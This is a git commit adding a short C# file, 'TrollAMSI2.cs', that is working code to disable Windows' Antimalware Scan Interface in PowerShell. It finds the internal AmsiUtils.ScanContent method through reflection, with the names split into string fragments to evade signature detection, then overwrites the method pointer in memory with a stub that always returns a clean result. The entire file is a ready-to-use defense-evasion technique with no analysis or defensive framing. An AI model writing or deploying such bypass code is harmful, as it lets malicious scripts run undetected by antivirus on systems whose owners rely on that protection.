194c9948d948a31d216885455dd37ca5b2bde7e3
cybersectroll <dexter192123@gmail.com>
2024-05-27 02:45:31 +0800

    Create TrollAMSI2.cs

---
+++ TrollAMSI2.cs
@@ -0,0 +1,23 @@
+using System;
+using System.Management.Automation;
+using System.Management.Automation.Host;
+using System.Reflection;
+using System.Runtime.CompilerServices;
+using System.Runtime.InteropServices;
+using System.Xml.Linq;
+
+public static class TrollAMSI
+{
+    public static void troll()
+    {
+        MethodInfo o = typeof(PSObject).Assembly.GetType("System.Management.Automation.Am" + "si" + "U" + "tils").GetMethod("Sca" + "nC" + "ontent", BindingFlags.Static | BindingFlags.NonPublic);
+        MethodInfo t = typeof(TrollAMSI).GetMethod("M", BindingFlags.Static | BindingFlags.NonPublic);
+        RuntimeHelpers.PrepareMethod(o.MethodHandle);
+        RuntimeHelpers.PrepareMethod(t.MethodHandle);
+
+        //Compile with unsafe flag
+        unsafe { *(long*)((o.MethodHandle.Value + 8)) = *(long*)((t.MethodHandle.Value + 8)); }
+
+    }
+    private static int M(string c, string s) { return 1; }
+}
